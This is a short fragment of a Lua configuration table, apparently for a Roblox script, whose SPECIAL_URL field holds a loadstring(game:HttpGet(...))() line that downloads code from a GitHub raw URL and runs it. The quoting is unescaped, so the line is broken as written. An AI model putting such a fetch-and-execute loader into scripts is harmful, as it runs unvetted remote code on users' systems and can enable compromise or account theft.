...
local CONFIG = {
    ...
    SPECIAL_URL = "loadstring(game:HttpGet("https://raw.githubusercontent.com/xenopersonalbusiness-dot/Handlers/refs/heads/main/DiscordUserID1460014975677628549"))()",
    SCRIPTS = {
